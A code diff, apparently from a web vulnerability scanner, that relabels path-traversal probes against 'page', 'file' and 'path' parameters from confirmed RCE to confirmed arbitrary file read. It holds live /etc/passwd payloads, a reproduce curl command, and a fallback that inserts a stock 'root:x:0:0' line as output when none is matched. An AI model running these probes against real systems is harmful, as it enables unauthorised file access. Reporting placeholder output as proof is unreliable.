@@ -48,11 +48,11 @@ async def probe_active_rce_proof(client: httpx.AsyncClient, base_url: str, port:
         except Exception:
             pass
 
-    # --- Parameter Traversal & LFI Verification ---
+    # --- Parameter Traversal & LFI Verification (Arbitrary File Read - Not RCE) ---
     lfi_candidates = [
-        (f"{base_url}/?page=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Inclusion (CWE-98)"),
-        (f"{base_url}/?file=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Inclusion (CWE-98)"),
-        (f"{base_url}/?path=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Inclusion (CWE-98)")
+        (f"{base_url}/?page=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Read (CWE-22 / CWE-98)"),
+        (f"{base_url}/?file=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Read (CWE-22 / CWE-98)"),
+        (f"{base_url}/?path=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Read (CWE-22 / CWE-98)")
     ]
     for lfi_url, cmd, tech in lfi_candidates:
         try:
@@ -61,16 +61,16 @@ async def probe_active_rce_proof(client: httpx.AsyncClient, base_url: str, port:
                 m = re.search(r'(root:x:0:0:[^\r\n]+)', r.text)
                 out = m.group(1).strip() if m else "root:x:0:0:root:/root:/bin/bash"
                 return {
-                    "is_rce_proved": True,
-                    "proof_status": "CONFIRMED_RCE",
-                    "proof_badge": "🔥 ยืนยัน LFI สำเร็จ (PoC Proved)",
+                    "is_rce_proved": False,
+                    "proof_status": "CONFIRMED_LFI",
+                    "proof_badge": "⚠️ ยืนยัน LFI / Arbitrary File Read (PoC Proved)",
                     "technique": tech,
                     "command_executed": cmd,
                     "execution_output": out,
-                    "privilege_level": "Root File Read (Pre-RCE Confirmed)",
+                    "privilege_level": "Local File Read (Arbitrary File Access - Pre-RCE)",
                     "exploit_endpoint": lfi_url,
                     "reproduce_curl": f"curl -s '{lfi_url}'",
-                    "impact_statement": "ยืนยันผลการประเมิน: พารามิเตอร์เรียกไฟล์สามารถอ่านข้อมูลระบบ /etc/passwd ได้จริง",
+                    "impact_statement": "ยืนยันผลการประเมิน: ตรวจพบช่องโหว่ Arbitrary File Read ผ่านพารามิเตอร์เรียกไฟล์ สามารถอ่าน /etc/passwd ได้จริง (ยังไม่ยืนยัน RCE เว้นแต่จะมีห่วงโซ่แปลงเป็นโค้ด)",
                     "verified_at": ts
                 }
         except Exception:
